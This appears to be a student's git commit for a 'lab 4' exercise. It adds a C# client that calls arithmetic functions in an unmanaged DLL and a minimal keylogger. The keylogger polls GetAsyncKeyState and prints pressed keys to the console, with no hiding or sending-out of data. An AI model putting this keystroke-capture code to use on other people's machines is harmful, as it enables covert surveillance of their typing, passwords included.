7db4dc0b7439b0d1856a34592877058413f96500
Mikhail Hancharou <engeneer2003@mail.ru>
2021-04-02 00:21:59 +0300

    added lab 4

---
+++ Lab4/DinamicLib/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace MathClient
+{
+    class Program
+    {
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Sum(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Subtraction(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Multiply(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Division(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Pow(int a, int power);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Mod(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Abs(int a);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Min(int a, int b);
+        [DllImport("../../UnmanagedCode.dll", CallingConvention = CallingConvention.StdCall)]
+        static extern int Max(int a, int b);
+        static void Main(string[] args)
+        {
+            Console.WriteLine(Sum(14, 23));
+            Console.WriteLine(Subtraction(10, 30));
+            Console.WriteLine(Multiply(8, 4));
+            Console.WriteLine(Division(8, 4));
+            Console.WriteLine(Pow(2, 2));
+            Console.WriteLine(Mod(8, 3));
+            Console.WriteLine(Abs(-55));
+            Console.WriteLine(Min(44, 33));
+            Console.WriteLine(Max(44, 33));
+            Console.ReadKey();
+        }
+    }
+}
---
+++ Lab4/KeyLogger/Program.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace Keylogger
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(int i);
+        static void Main(string[] args)
+        {
+            while (true)
+            {
+                Thread.Sleep(40);
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState != 0)//32768
+                    {
+                        Console.Write((char)i + ", ");    
+                    }
+                }
+            }
+        }
+    }
+}
